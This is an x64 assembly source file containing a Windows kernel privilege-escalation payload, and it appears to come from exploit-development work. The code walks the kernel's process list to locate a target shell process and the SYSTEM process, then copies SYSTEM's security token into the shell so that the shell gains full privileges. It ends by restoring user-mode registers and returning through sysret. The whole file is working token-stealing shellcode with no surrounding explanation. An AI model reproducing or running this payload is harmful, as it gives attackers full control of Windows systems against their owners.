.code
payload proc
	; Get shell PID
	pop rdx
	; _KPCR -> _KPRCB -> _KTHREAD (Current thread)
	xor rax, rax
	mov rax, gs:[rax + 188h]

	; _KTHREAD -> _KAPC_STATE -> _EPROCESS
	mov rax, [rax + 0b8h]
	
	; Save the current _EPROCESS address and look for the shell process
	mov rcx, rax

CheckShell:
	mov rax, [rax + 448h]
	sub rax, 448h
	cmp qword ptr [rax + 440h], rdx
	jne CheckShell

	; Save the address of _EPROCESS for the shell
	mov rdx, rax

	; Find PID 4 for the system process
	mov rax, rcx

CheckSystem:
	mov rax, [rax + 448h]
	sub rax, 448h
	cmp qword ptr [rax + 440h], 4
	jne CheckSystem

	; Copy system security token to our process to raise our permissions to system
	mov rax, [rax + 4b8h]
	and al, 0f0h
	mov [rdx + 4b8h], rax

	; Cleanup and return to user mode
	; _KPCR -> _KPRCB -> _KTHREAD -> _KTRAP_FRAME
	mov rax, gs:[188h]
	;int 3
	mov rax, [rax + 90h]

	; Restore stack/instruction pointers and register flags
	; rsp
	mov rsp, [rax + 180h]
	; rbp
	mov rbp, [rax + 158h]
	; rip
	mov rcx, [rax + 168h]
	; eflags
	xor r11, r11
	mov r11d, dword ptr [rax + 178h]

	xor rax, rax
	swapgs
	sysret
payload endp
end